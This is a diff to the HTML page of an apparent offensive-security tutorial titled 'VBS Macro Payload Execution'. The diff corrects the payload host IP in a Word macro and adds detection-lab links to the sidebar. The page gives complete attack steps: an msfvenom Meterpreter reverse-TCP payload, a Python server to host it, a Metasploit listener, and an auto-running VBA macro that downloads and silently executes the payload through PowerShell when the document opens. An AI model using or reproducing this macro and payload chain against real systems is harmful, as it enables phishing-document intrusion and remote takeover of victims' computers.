@@ -9,7 +9,7 @@
 <link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180" />
 <link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
 <title>[02] VBS Macro Payload Execution – RTFM</title>
-  <meta name="description" content=" By: Prasanna | October 26, 2026 STEP 1: Set up client machine In the attacker machine generate a payload as shown below $ msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=192.168.10.10 LPORT=4444 -o payload.exe #### SET UP PYTHON SERVER TO HOST THE PAYLOAD $ python3 -m http.server Now start MSF CONSOLE and set up the listener $ msfdb run $ msf &gt; use exploi/multi/handler $ msf &gt; set payload windows/x64/meterpreter/reverse_tcp $ msf &gt; set LHOST 192.168.10.10 $ msf &gt; set LPORT 4444 $ msf &gt; run STEP 2: Malicious VBS Script In MS Word, embed the malicious VBS script by choosing View and click on Macros Next Create a macro called MyMacro Edit the macro and input the below mentioned VBA Code to that downloads and executes the payload. Sub Document_Open() MyMacro End Sub Sub AutoOpen() MyMacro End Sub Sub MyMacro() Dim str As String str = &#34;powershell (New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.119.120/payload.exe&#39;, &#39;payload.exe&#39;)&#34; Shell str, vbHide Dim exePath As String exePath = ActiveDocument.Path &amp; &#34;\&#34; &amp; &#34;payload.exe&#34; Wait (2) Shell exePath, vbHide End Sub Sub Wait(n As Long) Dim t As Date t = Now Do DoEvents Loop Until Now &gt;= DateAdd(&#34;s&#34;, n, t) End Sub Save the document as Macro Enabled and open the document to see the execution. " /><link rel="canonical" href="http://localhost:1313/docs/03_techniques/02-vbs-macro-payload-execution/" itemprop="url" />
+  <meta name="description" content=" By: Prasanna | October 26, 2026 STEP 1: Set up client machine In the attacker machine generate a payload as shown below $ msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=192.168.10.10 LPORT=4444 -o payload.exe #### SET UP PYTHON SERVER TO HOST THE PAYLOAD $ python3 -m http.server Now start MSF CONSOLE and set up the listener $ msfdb run $ msf &gt; use exploi/multi/handler $ msf &gt; set payload windows/x64/meterpreter/reverse_tcp $ msf &gt; set LHOST 192.168.10.10 $ msf &gt; set LPORT 4444 $ msf &gt; run STEP 2: Malicious VBS Script In MS Word, embed the malicious VBS script by choosing View and click on Macros Next Create a macro called MyMacro Edit the macro and input the below mentioned VBA Code to that downloads and executes the payload. Sub Document_Open() MyMacro End Sub Sub AutoOpen() MyMacro End Sub Sub MyMacro() Dim str As String str = &#34;powershell (New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.10.10/payload.exe&#39;, &#39;payload.exe&#39;)&#34; Shell str, vbHide Dim exePath As String exePath = ActiveDocument.Path &amp; &#34;\&#34; &amp; &#34;payload.exe&#34; Wait (2) Shell exePath, vbHide End Sub Sub Wait(n As Long) Dim t As Date t = Now Do DoEvents Loop Until Now &gt;= DateAdd(&#34;s&#34;, n, t) End Sub Save the document as Macro Enabled and open the document to see the execution. " /><link rel="canonical" href="http://localhost:1313/docs/03_techniques/02-vbs-macro-payload-execution/" itemprop="url" />
 
 <meta property="og:title" content="[02] VBS Macro Payload Execution">
 <meta
@@ -101,7 +101,7 @@ End Sub
 
 Sub MyMacro()
     Dim str As String
-    str = &#34;powershell (New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.119.120/payload.exe&#39;, &#39;payload.exe&#39;)&#34;
+    str = &#34;powershell (New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.10.10/payload.exe&#39;, &#39;payload.exe&#39;)&#34;
     Shell str, vbHide
     Dim exePath As String
     exePath = ActiveDocument.Path &amp; &#34;\&#34; &amp; &#34;payload.exe&#34;
@@ -148,14 +148,14 @@ Save the document as Macro Enabled and open the document to see the execution.
 
 
 	<meta itemprop="name" content="[02] VBS Macro Payload Execution">
-	<meta itemprop="description" content="By: Prasanna | October 26, 2026 STEP 1: Set up client machine In the attacker machine generate a payload as shown below $ msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=192.168.10.10 LPORT=4444 -o payload.exe #### SET UP PYTHON SERVER TO HOST THE PAYLOAD $ python3 -m http.server Now start MSF CONSOLE and set up the listener $ msfdb run $ msf &gt; use exploi/multi/handler $ msf &gt; set payload windows/x64/meterpreter/reverse_tcp $ msf &gt; set LHOST 192.168.10.10 $ msf &gt; set LPORT 4444 $ msf &gt; run STEP 2: Malicious VBS Script In MS Word, embed the malicious VBS script by choosing View and click on Macros Next Create a macro called MyMacro Edit the macro and input the below mentioned VBA Code to that downloads and executes the payload. Sub Document_Open() MyMacro End Sub Sub AutoOpen() MyMacro End Sub Sub MyMacro() Dim str As String str = &#34;powershell (New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.119.120/payload.exe&#39;, &#39;payload.exe&#39;)&#34; Shell str, vbHide Dim exePath As String exePath = ActiveDocument.Path &amp; &#34;\&#34; &amp; &#34;payload.exe&#34; Wait (2) Shell exePath, vbHide End Sub Sub Wait(n As Long) Dim t As Date t = Now Do DoEvents Loop Until Now &gt;= DateAdd(&#34;s&#34;, n, t) End Sub Save the document as Macro Enabled and open the document to see the execution.">
+	<meta itemprop="description" content="By: Prasanna | October 26, 2026 STEP 1: Set up client machine In the attacker machine generate a payload as shown below $ msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=192.168.10.10 LPORT=4444 -o payload.exe #### SET UP PYTHON SERVER TO HOST THE PAYLOAD $ python3 -m http.server Now start MSF CONSOLE and set up the listener $ msfdb run $ msf &gt; use exploi/multi/handler $ msf &gt; set payload windows/x64/meterpreter/reverse_tcp $ msf &gt; set LHOST 192.168.10.10 $ msf &gt; set LPORT 4444 $ msf &gt; run STEP 2: Malicious VBS Script In MS Word, embed the malicious VBS script by choosing View and click on Macros Next Create a macro called MyMacro Edit the macro and input the below mentioned VBA Code to that downloads and executes the payload. Sub Document_Open() MyMacro End Sub Sub AutoOpen() MyMacro End Sub Sub MyMacro() Dim str As String str = &#34;powershell (New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.10.10/payload.exe&#39;, &#39;payload.exe&#39;)&#34; Shell str, vbHide Dim exePath As String exePath = ActiveDocument.Path &amp; &#34;\&#34; &amp; &#34;payload.exe&#34; Wait (2) Shell exePath, vbHide End Sub Sub Wait(n As Long) Dim t As Date t = Now Do DoEvents Loop Until Now &gt;= DateAdd(&#34;s&#34;, n, t) End Sub Save the document as Macro Enabled and open the document to see the execution.">
 	<meta itemprop="datePublished" content="2026-10-26T00:00:00+00:00">
 	<meta itemprop="dateModified" content="2026-10-26T00:00:00+00:00">
 	<meta itemprop="wordCount" content="206">
 	<meta itemprop="keywords" content="Prasanna V Balaji">
 	<meta name="twitter:card" content="summary">
 	<meta name="twitter:title" content="[02] VBS Macro Payload Execution">
-	<meta name="twitter:description" content="By: Prasanna | October 26, 2026 STEP 1: Set up client machine In the attacker machine generate a payload as shown below $ msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=192.168.10.10 LPORT=4444 -o payload.exe #### SET UP PYTHON SERVER TO HOST THE PAYLOAD $ python3 -m http.server Now start MSF CONSOLE and set up the listener $ msfdb run $ msf &gt; use exploi/multi/handler $ msf &gt; set payload windows/x64/meterpreter/reverse_tcp $ msf &gt; set LHOST 192.168.10.10 $ msf &gt; set LPORT 4444 $ msf &gt; run STEP 2: Malicious VBS Script In MS Word, embed the malicious VBS script by choosing View and click on Macros Next Create a macro called MyMacro Edit the macro and input the below mentioned VBA Code to that downloads and executes the payload. Sub Document_Open() MyMacro End Sub Sub AutoOpen() MyMacro End Sub Sub MyMacro() Dim str As String str = &#34;powershell (New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.119.120/payload.exe&#39;, &#39;payload.exe&#39;)&#34; Shell str, vbHide Dim exePath As String exePath = ActiveDocument.Path &amp; &#34;\&#34; &amp; &#34;payload.exe&#34; Wait (2) Shell exePath, vbHide End Sub Sub Wait(n As Long) Dim t As Date t = Now Do DoEvents Loop Until Now &gt;= DateAdd(&#34;s&#34;, n, t) End Sub Save the document as Macro Enabled and open the document to see the execution.">
+	<meta name="twitter:description" content="By: Prasanna | October 26, 2026 STEP 1: Set up client machine In the attacker machine generate a payload as shown below $ msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=192.168.10.10 LPORT=4444 -o payload.exe #### SET UP PYTHON SERVER TO HOST THE PAYLOAD $ python3 -m http.server Now start MSF CONSOLE and set up the listener $ msfdb run $ msf &gt; use exploi/multi/handler $ msf &gt; set payload windows/x64/meterpreter/reverse_tcp $ msf &gt; set LHOST 192.168.10.10 $ msf &gt; set LPORT 4444 $ msf &gt; run STEP 2: Malicious VBS Script In MS Word, embed the malicious VBS script by choosing View and click on Macros Next Create a macro called MyMacro Edit the macro and input the below mentioned VBA Code to that downloads and executes the payload. Sub Document_Open() MyMacro End Sub Sub AutoOpen() MyMacro End Sub Sub MyMacro() Dim str As String str = &#34;powershell (New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.10.10/payload.exe&#39;, &#39;payload.exe&#39;)&#34; Shell str, vbHide Dim exePath As String exePath = ActiveDocument.Path &amp; &#34;\&#34; &amp; &#34;payload.exe&#34; Wait (2) Shell exePath, vbHide End Sub Sub Wait(n As Long) Dim t As Date t = Now Do DoEvents Loop Until Now &gt;= DateAdd(&#34;s&#34;, n, t) End Sub Save the document as Macro Enabled and open the document to see the execution.">
 <link href="/css/compiled/main.css" rel="stylesheet" />
     <link href="/css/variables.css" rel="stylesheet" />
     <link href="/css/custom.css" rel="stylesheet" />
@@ -198,7 +198,43 @@ Save the document as Macro Enabled and open the document to see the execution.
     </a>
       <button type="button" class="hextra-sidebar-collapsible-button hx:absolute hx:top-1/2 hx:-translate-y-1/2 hx:ltr:right-2 hx:rtl:left-2 hx:shrink-0 hx:cursor-pointer hx:p-0 hx:text-gray-500 hx:dark:text-neutral-400 hx:group-hover:text-gray-900 hx:dark:group-hover:text-gray-50 hx:group-data-[active=true]:text-primary-800 hx:group-data-[active=true]:dark:text-primary-600 hx:hextra-focus-visible-inset" aria-label="Toggle section" aria-expanded="true"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true" focusable="false" class="hx:h-[18px] hx:min-w-[18px] hx:rounded-xs hx:p-0.5 hx:hover:bg-gray-800/5 hx:dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx:origin-center hx:transition-transform hx:rtl:-rotate-180"></path></svg></button>
   </div><div class="hextra-sidebar-children hx:ltr:pr-0 hx:rtl:pl-0 hx:overflow-hidden">
-        <ul class='hx:relative hx:flex hx:flex-col hx:gap-1 hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:ltr:ml-3 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:mr-3 hx:rtl:pr-3 hx:rtl:before:right-0 hx:dark:before:bg-neutral-800'><li class="hx:flex hx:flex-col open"><div class="hextra-sidebar-item hx:group hx:relative hx:flex hx:items-center" data-active="false">
+        <ul class='hx:relative hx:flex hx:flex-col hx:gap-1 hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:ltr:ml-3 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:mr-3 hx:rtl:pr-3 hx:rtl:before:right-0 hx:dark:before:bg-neutral-800'><li class="hx:flex hx:flex-col "><div class="hextra-sidebar-item hx:group hx:relative hx:flex hx:items-center" data-active="false">
+    <a
+      class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:grow hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:hextra-focus-visible-inset hx:ltr:pr-8 hx:rtl:pl-8 hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+      href="/docs/05_detection/"
+      
+    >
+      <span class="hx:min-w-0 [word-break:break-word]">Detection</span>
+    </a>
+      <button type="button" class="hextra-sidebar-collapsible-button hx:absolute hx:top-1/2 hx:-translate-y-1/2 hx:ltr:right-2 hx:rtl:left-2 hx:shrink-0 hx:cursor-pointer hx:p-0 hx:text-gray-500 hx:dark:text-neutral-400 hx:group-hover:text-gray-900 hx:dark:group-hover:text-gray-50 hx:group-data-[active=true]:text-primary-800 hx:group-data-[active=true]:dark:text-primary-600 hx:hextra-focus-visible-inset" aria-label="Toggle section" aria-expanded="false"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true" focusable="false" class="hx:h-[18px] hx:min-w-[18px] hx:rounded-xs hx:p-0.5 hx:hover:bg-gray-800/5 hx:dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx:origin-center hx:transition-transform hx:rtl:-rotate-180"></path></svg></button>
+  </div>
+              <div class="hextra-sidebar-children hx:ltr:pr-0 hx:rtl:pl-0 hx:overflow-hidden">
+        <ul class='hx:relative hx:flex hx:flex-col hx:gap-1 hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:ltr:ml-3 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:mr-3 hx:rtl:pr-3 hx:rtl:before:right-0 hx:dark:before:bg-neutral-800'><li class="hx:flex hx:flex-col "><div class="hextra-sidebar-item hx:group hx:relative hx:flex hx:items-center" data-active="false">
+    <a
+      class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:grow hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:hextra-focus-visible-inset hx:ltr:pr-8 hx:rtl:pl-8 hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+      href="/docs/05_detection/5.1_labs/"
+      
+    >
+      <span class="hx:min-w-0 [word-break:break-word]">Detection labs</span>
+    </a>
+      <button type="button" class="hextra-sidebar-collapsible-button hx:absolute hx:top-1/2 hx:-translate-y-1/2 hx:ltr:right-2 hx:rtl:left-2 hx:shrink-0 hx:cursor-pointer hx:p-0 hx:text-gray-500 hx:dark:text-neutral-400 hx:group-hover:text-gray-900 hx:dark:group-hover:text-gray-50 hx:group-data-[active=true]:text-primary-800 hx:group-data-[active=true]:dark:text-primary-600 hx:hextra-focus-visible-inset" aria-label="Toggle section" aria-expanded="false"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true" focusable="false" class="hx:h-[18px] hx:min-w-[18px] hx:rounded-xs hx:p-0.5 hx:hover:bg-gray-800/5 hx:dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx:origin-center hx:transition-transform hx:rtl:-rotate-180"></path></svg></button>
+  </div>
+              <div class="hextra-sidebar-children hx:ltr:pr-0 hx:rtl:pl-0 hx:overflow-hidden">
+        <ul class='hx:relative hx:flex hx:flex-col hx:gap-1 hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:ltr:ml-3 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:mr-3 hx:rtl:pr-3 hx:rtl:before:right-0 hx:dark:before:bg-neutral-800'><li class="hx:flex hx:flex-col "><div class="hextra-sidebar-item hx:group hx:relative hx:flex hx:items-center" data-active="false">
+    <a
+      class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:grow hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:hextra-focus-visible-inset hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+      href="/docs/05_detection/5.1_labs/01-workshop-intro/"
+      
+    >
+      <span class="hx:min-w-0 [word-break:break-word]">Workshop Introduction</span>
+    </a>
+  </div>
+              
+            </li></ul>
+      </div>
+            </li></ul>
+      </div>
+            </li><li class="hx:flex hx:flex-col open"><div class="hextra-sidebar-item hx:group hx:relative hx:flex hx:items-center" data-active="false">
     <a
       class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:grow hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:hextra-focus-visible-inset hx:ltr:pr-8 hx:rtl:pl-8 hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
       href="/docs/03_techniques/"
@@ -567,22 +603,47 @@ Save the document as Macro Enabled and open the document to see the execution.
               
             </li></ul>
       </div>
-            </li><li class="hx:flex hx:flex-col "><div class="hextra-sidebar-item hx:group hx:relative hx:flex hx:items-center" data-active="false">
-    <a
-      class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:grow hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:hextra-focus-visible-inset hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
-      href="/docs/05_detection/"
-      
-    >
-      <span class="hx:min-w-0 [word-break:break-word]">Detection</span>
-    </a>
-  </div>
-              
             </li></ul>
       </div></li>
     </ul>
 
     <ul class="hx:flex hx:flex-col hx:gap-1 hx:max-md:hidden">
         
+            <li class=""><div class="hextra-sidebar-item hx:group hx:relative hx:flex hx:items-center" data-active="false">
+    <a
+      class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:grow hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:hextra-focus-visible-inset hx:ltr:pr-8 hx:rtl:pl-8 hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+      href="/docs/05_detection/"
+      
+    >
+      <span class="hx:min-w-0 [word-break:break-word]">Detection</span>
+    </a>
+      <button type="button" class="hextra-sidebar-collapsible-button hx:absolute hx:top-1/2 hx:-translate-y-1/2 hx:ltr:right-2 hx:rtl:left-2 hx:shrink-0 hx:cursor-pointer hx:p-0 hx:text-gray-500 hx:dark:text-neutral-400 hx:group-hover:text-gray-900 hx:dark:group-hover:text-gray-50 hx:group-data-[active=true]:text-primary-800 hx:group-data-[active=true]:dark:text-primary-600 hx:hextra-focus-visible-inset" aria-label="Toggle section" aria-expanded="false"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true" focusable="false" class="hx:h-[18px] hx:min-w-[18px] hx:rounded-xs hx:p-0.5 hx:hover:bg-gray-800/5 hx:dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx:origin-center hx:transition-transform hx:rtl:-rotate-180"></path></svg></button>
+  </div><div class="hextra-sidebar-children hx:ltr:pr-0 hx:rtl:pl-0 hx:overflow-hidden">
+        <ul class='hx:relative hx:flex hx:flex-col hx:gap-1 hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:ltr:ml-3 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:mr-3 hx:rtl:pr-3 hx:rtl:before:right-0 hx:dark:before:bg-neutral-800'><li class="hx:flex hx:flex-col "><div class="hextra-sidebar-item hx:group hx:relative hx:flex hx:items-center" data-active="false">
+    <a
+      class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:grow hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:hextra-focus-visible-inset hx:ltr:pr-8 hx:rtl:pl-8 hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+      href="/docs/05_detection/5.1_labs/"
+      
+    >
+      <span class="hx:min-w-0 [word-break:break-word]">Detection labs</span>
+    </a>
+      <button type="button" class="hextra-sidebar-collapsible-button hx:absolute hx:top-1/2 hx:-translate-y-1/2 hx:ltr:right-2 hx:rtl:left-2 hx:shrink-0 hx:cursor-pointer hx:p-0 hx:text-gray-500 hx:dark:text-neutral-400 hx:group-hover:text-gray-900 hx:dark:group-hover:text-gray-50 hx:group-data-[active=true]:text-primary-800 hx:group-data-[active=true]:dark:text-primary-600 hx:hextra-focus-visible-inset" aria-label="Toggle section" aria-expanded="false"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true" focusable="false" class="hx:h-[18px] hx:min-w-[18px] hx:rounded-xs hx:p-0.5 hx:hover:bg-gray-800/5 hx:dark:hover:bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx:origin-center hx:transition-transform hx:rtl:-rotate-180"></path></svg></button>
+  </div>
+              <div class="hextra-sidebar-children hx:ltr:pr-0 hx:rtl:pl-0 hx:overflow-hidden">
+        <ul class='hx:relative hx:flex hx:flex-col hx:gap-1 hx:before:absolute hx:before:inset-y-1 hx:before:w-px hx:before:bg-gray-200 hx:before:content-[""] hx:ltr:ml-3 hx:ltr:pl-3 hx:ltr:before:left-0 hx:rtl:mr-3 hx:rtl:pr-3 hx:rtl:before:right-0 hx:dark:before:bg-neutral-800'><li class="hx:flex hx:flex-col "><div class="hextra-sidebar-item hx:group hx:relative hx:flex hx:items-center" data-active="false">
+    <a
+      class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:grow hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:hextra-focus-visible-inset hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+      href="/docs/05_detection/5.1_labs/01-workshop-intro/"
+      
+    >
+      <span class="hx:min-w-0 [word-break:break-word]">Workshop Introduction</span>
+    </a>
+  </div>
+              
+            </li></ul>
+      </div>
+            </li></ul>
+      </div></li>
             <li class="open"><div class="hextra-sidebar-item hx:group hx:relative hx:flex hx:items-center" data-active="false">
     <a
       class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:grow hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:hextra-focus-visible-inset hx:ltr:pr-8 hx:rtl:pl-8 hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
@@ -938,15 +999,6 @@ Save the document as Macro Enabled and open the document to see the execution.
               
             </li></ul>
       </div></li>
-            <li class=""><div class="hextra-sidebar-item hx:group hx:relative hx:flex hx:items-center" data-active="false">
-    <a
-      class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:grow hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:hextra-focus-visible-inset hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
-      href="/docs/05_detection/"
-      
-    >
-      <span class="hx:min-w-0 [word-break:break-word]">Detection</span>
-    </a>
-  </div></li>
         
       </ul>
     </div>
@@ -1154,7 +1206,7 @@ End Sub
 
 Sub MyMacro()
     Dim str As String
-    str = &#34;powershell (New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.119.120/payload.exe&#39;, &#39;payload.exe&#39;)&#34;
+    str = &#34;powershell (New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.10.10/payload.exe&#39;, &#39;payload.exe&#39;)&#34;
     Shell str, vbHide
     Dim exePath As String
     exePath = ActiveDocument.Path &amp; &#34;\&#34; &amp; &#34;payload.exe&#34;
